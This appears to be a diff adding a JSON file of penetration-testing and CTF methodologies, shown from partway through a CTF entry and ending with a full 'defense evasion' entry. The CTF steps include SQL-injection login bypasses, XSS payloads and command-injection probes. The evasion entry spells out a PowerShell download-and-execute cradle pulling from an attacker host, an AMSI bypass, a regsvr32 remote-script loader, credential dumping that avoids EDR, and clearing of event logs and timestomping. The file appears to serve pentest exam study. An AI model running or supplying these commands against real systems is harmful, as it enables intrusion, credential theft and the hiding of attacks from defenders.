+      "binwalk -e firmware/images to extract embedded files, then examine each",
+      "XOR with common keys: 0x41 (A), 0x20 (space), single-byte bruteforce"
+    ],
+    "quickRef": "file <target> | binwalk -e <target> | steghide extract -sf <file> -p <pass> | exiftool <file> | cyberchef decode",
+    "steps": [
+      {
+        "phase": "Phase 1 - Initial File Analysis",
+        "tools": [
+          "file",
+          "exiftool",
+          "binwalk",
+          "strings"
+        ],
+        "techniques": [
+          "steganography"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "File type unknown",
+            "action": "file <target> — identify true file type (magic bytes can lie)",
+            "fallback": "Check file size: ls -la and compare against expected content"
+          },
+          {
+            "condition": "Image file received",
+            "action": "exiftool <file> — look for hidden comments, GPS data, embedded credentials",
+            "fallback": "binwalk <file> — check for appended data or embedded archives"
+          },
+          {
+            "condition": "Binary or firmware received",
+            "action": "binwalk -eM <file> — extract and recursively analyze embedded files",
+            "fallback": "strings -a <file> | grep -i 'flag\\|key\\|pass\\|ctf' for plaintext hints"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 2 - Decoding & Encoding Challenges",
+        "tools": [
+          "cyberchef",
+          "python"
+        ],
+        "techniques": [
+          "crypto-analysis"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Base64-looking string found (A-Za-z0-9+/=)",
+            "action": "echo '<string>' | base64 -d — or use CyberChef 'From Base64' recipe",
+            "fallback": "Try base32, base85, URL-decode, hex-decode in sequence"
+          },
+          {
+            "condition": "ROT13 or Caesar cipher suspected",
+            "action": "CyberChef 'ROT13' or try all 26 shifts with python -c one-liner",
+            "fallback": "Check if text reads like English at any shift"
+          },
+          {
+            "condition": "Hex string found (0x-prefixed or pairs of hex chars)",
+            "action": "echo '<hex>' | xxd -r -p — or CyberChef 'From Hex'",
+            "fallback": "Check if decoded hex is another encoded layer"
+          },
+          {
+            "condition": "Morse code detected (... --- ...)",
+            "action": "CyberChef 'From Morse Code' — watch for proper spacing interpretation",
+            "fallback": "Manual decode: 3 spaces = word boundary, 1 space = letter boundary"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 3 - Steganography",
+        "tools": [
+          "steghide",
+          "stegsolve",
+          "zsteg",
+          "stegcracker"
+        ],
+        "techniques": [
+          "steganography"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Steganography challenge with image",
+            "action": "steghide extract -sf <file> -p '' (try empty passphrase first — most common in CTF)",
+            "fallback": "stegcracker <file> /usr/share/wordlists/rockyou.txt for passphrase cracking"
+          },
+          {
+            "condition": "PNG file with LSB steganography",
+            "action": "zsteg -a <file> — checks for LSB, RGB channel, and other PNG-based hiding",
+            "fallback": "Stegsolve — check all color plane and filter combinations visually"
+          },
+          {
+            "condition": "Need to find hidden data in image",
+            "action": "Stegsolve — step through Red/Green/Blue planes, Alpha, and filters",
+            "fallback": "Check PNG chunks: pngcheck -v <file> — look for tEXt, zTXt, or unusual chunks"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 4 - Cryptography",
+        "tools": [
+          "cyberchef",
+          "hash-identifier",
+          "john",
+          "hashcat"
+        ],
+        "techniques": [
+          "crypto-analysis"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Hash-like string found (fixed length hex)",
+            "action": "hash-identifier <hash> — identify hash type, then crack with hashcat -m <mode> -a 0",
+            "fallback": "Try online databases: crackstation.net, hashtoolkit.com"
+          },
+          {
+            "condition": "RSA challenge with known factors n, e, c",
+            "action": "If p, q known: compute phi, d = modinv(e, phi), then m = pow(c, d, n)",
+            "fallback": "If n is factored on factordb.com, use the factors to decrypt"
+          },
+          {
+            "condition": "XOR'd data suspected",
+            "action": "Single-byte XOR: python3 -c 'for i in range(256): print(bytes([b^i for b in data]))'",
+            "fallback": "Multi-byte XOR: try common keys or use cyberchef Xor Brute Force"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 5 - Forensics",
+        "tools": [
+          "volatility",
+          "binwalk",
+          "foremost",
+          "scalpel"
+        ],
+        "techniques": [
+          "steganography"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Memory dump or disk image received",
+            "action": "volatility -f <image> imageinfo — identify OS profile, then run pslist, netscan, filescan",
+            "fallback": "Check for embedded files with binwalk or foremost"
+          },
+          {
+            "condition": "Deleted file recovery needed",
+            "action": "foremost -i <image> -o <output> — or scalpel with custom config",
+            "fallback": "volatility — filescan, then dumpfiles for specific file recovery"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 6 - Web CTF Exploitation",
+        "tools": [
+          "ffuf",
+          "burpsuite",
+          "sqlmap",
+          "dalfox"
+        ],
+        "techniques": [
+          "sqli-auth-bypass",
+          "xss-reflected"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Login form on web challenge",
+            "action": "Test SQLi auth bypass: admin' OR '1'='1' -- or admin' UNION SELECT 1,'admin','x' --",
+            "fallback": "Try NoSQL injection: {'$ne': null} if NoSQL backend"
+          },
+          {
+            "condition": "XSS parameter found",
+            "action": "Test <script>alert(1)</script> — if filtered, try <img src=x onerror=alert(1)>",
+            "fallback": "Use dalfox or XSStrike for automated payload generation"
+          },
+          {
+            "condition": "Command injection suspected",
+            "action": "Test ;id, |id, $(id), or ${IFS} — URL-encode the payload",
+            "fallback": "Use commix --url=... --batch for automated detection"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "defense-evasion-argha-dey-methodology",
+    "zone": "defense-evasion",
+    "name": "Argha Dey Defense Evasion Methodology",
+    "source": "Argha Dey CPENT Notes (94% scorer)",
+    "description": "Techniques for evading antivirus, EDR, firewalls, and application whitelisting during penetration testing. Covers AMSI bypass, PowerShell obfuscation, LOLBins, and living-off-the-land techniques.",
+    "examHabits": [
+      "PowerShell execution policy bypass: -exec bypass or -ep bypass",
+      "Use Invoke-Obfuscation for multi-layer obfuscation of PowerShell payloads",
+      "Reflective loading: load Mimikatz/PE into memory via Rubeus or SafetyKatz to avoid disk writes",
+      "LOLBins: use regsvr32, rundll32, or mshta for executing payloads without writing to disk",
+      "Check AMSI before running any PowerShell — patch amsiInitFailed if needed"
+    ],
+    "quickRef": "powershell -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload'); amsi bypass; Invoke-Obfuscation",
+    "steps": [
+      {
+        "phase": "Phase 1 - AMSI Bypass",
+        "tools": [
+          "powershell",
+          "mimikatz"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "PowerShell AMSI scanning active",
+            "action": "Bypass via reflection: [Ref].Assembly.GetType('System.Management.Automation.'+'AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+            "fallback": "Use encrypted command: powershell -enc <b64_encoded_payload> where payload is AMSI-bypassed"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 2 - Obfuscation & Encoding",
+        "tools": [
+          "invoke-obfuscation",
+          "certutil",
+          "powershell"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "AV signature detection on payloads",
+            "action": "Invoke-Obfuscation — choose token, string, or command encoding",
+            "fallback": "Manual: break strings into parts, use char codes, Base64 encode"
+          },
+          {
+            "condition": "Network-based detection (IDS/IPS)",
+            "action": "Use HTTPS for C2, encode traffic, use DNS tunneling",
+            "fallback": "HTTP proxy through chisel/ligolo to blend with normal traffic"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 3 - Living Off The Land Binaries (LOLBins)",
+        "tools": [
+          "runas",
+          "regsvr32",
+          "rundll32",
+          "mshta"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Need to execute code without downloading binaries",
+            "action": "regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll",
+            "fallback": "rundll32 javascript:eval(...).Process"
+          },
+          {
+            "condition": "Application whitelisting enforced",
+            "action": "Check LOLBAS project for approved binaries that can execute scripts",
+            "fallback": "Use signed binaries to load unsigned payloads via Reflective DLL injection"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 4 - EDR Evasion",
+        "tools": [
+          "mimikatz",
+          "rubeus",
+          "safetykatz"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "EDR hooking on syscalls",
+            "action": "Use direct syscall (syscaller) or unhook via DLL unmapping",
+            "fallback": "Reflective loading: load tools directly into memory without CreateProcess"
+          },
+          {
+            "condition": "Need to dump credentials without EDR catching",
+            "action": "SafetyKatz — only loads necessary modules into memory",
+            "fallback": "Rubeus — kerberoasting without touching LSASS"
+          }
+        ]
+      },
+      {
+        "phase": "Phase 5 - Log Evasion & Cleanup",
+        "tools": [
+          "mimikatz",
+          "powershell"
+        ],
+        "decisionPoints": [
+          {
+            "condition": "Windows event logs contain traces",
+            "action": "mimikatz # event::clear — removes all security event log entries",
+            "fallback": "wevtutil cl Security — clear via command line"
+          },
+          {
+            "condition": "Need forensic artifact removal",
+            "action": "Clear prefetch, shimcache, and AMCache entries",
+            "fallback": "Timestomp file creation/access times with powershell or timestomp.exe"
+          }
+        ]
+      }
+    ]
+  }
+]
